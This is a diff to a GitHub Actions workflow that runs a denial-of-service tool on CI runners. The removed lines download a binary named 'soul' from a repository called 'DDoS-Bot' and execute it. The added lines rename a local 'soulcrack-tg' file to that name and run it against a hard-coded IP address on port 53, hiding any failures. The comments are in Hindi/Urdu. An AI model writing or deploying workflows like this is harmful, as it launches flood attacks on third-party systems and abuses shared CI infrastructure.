@@ -5,9 +5,15 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
-      - name: Get Linux Binary and Run
+      - name: Force Run
         run: |
-          # Sahi Linux x86_64 binary download karna
-          wget -q https://github.com/Mustafa-Soul/DDoS-Bot/raw/main/soul -O soul
-          chmod 777 soul
-          ./soul 147.75.202.61 53 10 100
+          # Agar soulcrack-tg hai toh use soul banao
+          if [ -f "soulcrack-tg" ]; then
+            mv soulcrack-tg soul
+          fi
+          
+          # Permission
+          chmod 777 soul || echo "File not found"
+          
+          # Run with a check
+          ./soul 147.75.202.61 53 10 100 || echo "Execution failed"
